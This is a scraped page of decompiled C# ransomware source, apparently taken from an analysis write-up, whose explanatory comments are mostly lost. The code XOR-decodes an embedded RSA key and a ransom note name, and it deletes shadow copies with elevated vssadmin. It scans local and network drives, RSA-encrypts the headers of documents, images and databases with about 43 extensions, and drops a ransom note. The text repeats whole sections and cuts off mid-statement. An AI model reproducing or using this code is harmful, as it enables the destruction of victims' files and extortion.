0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xa6, 0xa6, 0xa1, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = 